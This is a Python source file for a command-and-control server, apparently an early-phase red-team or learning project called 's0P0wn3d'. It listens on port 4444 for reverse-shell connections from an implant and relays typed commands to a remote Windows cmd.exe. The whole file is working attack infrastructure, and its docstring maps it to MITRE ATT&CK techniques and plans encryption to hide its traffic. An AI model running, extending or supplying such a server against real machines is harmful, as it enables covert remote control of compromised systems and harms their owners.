#!/usr/bin/env python3
"""
s0P0wn3d - C2 Server MVP (Phase 1 - No encryption)

Listens for reverse shell connections from the implant.
Communications are in plaintext — Phase 2 will add AES-256-CBC + RSA.

MITRE ATT&CK:
  T1090   - Proxy (C2 channel)
  T1095   - Non-Application Layer Protocol

Known weaknesses (Phase 1):
  - Traffic visible in Wireshark
  - No authentication between implant and C2
Next steps (Phase 2):
  - AES-256-CBC symmetric encryption
  - RSA-2048 asymmetric key exchange
"""

import socket
import threading
import sys

HOST = "0.0.0.0"
PORT = 4444


def handle_session(conn, addr):
    """Handle a reverse shell session."""
    print(f"\n[+] New connection from {addr[0]}:{addr[1]}")
    print("[+] Interactive shell — type 'exit' to close\n")

    try:
        while True:
            # Send command
            cmd = input(f"[{addr[0]}]> ")
            if not cmd:
                continue
            if cmd.lower() == "exit":
                conn.close()
                break

            # Send command with CRLF (cmd.exe requires it)
            conn.send((cmd + "\r\n").encode("utf-8"))

            # Receive response
            response = b""
            conn.settimeout(3)
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass

            if response:
                print(response.decode("utf-8", errors="ignore"), end="")

    except (ConnectionResetError, BrokenPipeError):
        print(f"\n[-] Connection lost with {addr[0]}")
    except KeyboardInterrupt:
        print("\n[!] Closing session")
    finally:
        conn.close()


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)

    print(f"""
 ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
 ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

[*] C2 Server MVP — Listening on {HOST}:{PORT}
[*] Waiting for connections...
[!] Phase 1: plaintext — Wireshark will show traffic in clear
""")

    try:
        while True:
            conn, addr = server.accept()
            t = threading.Thread(
                target=handle_session,
                args=(conn, addr),
                daemon=True
            )
            t.start()
    except KeyboardInterrupt:
        print("\n[!] C2 server stopped")
        server.close()


if __name__ == "__main__":
    main()
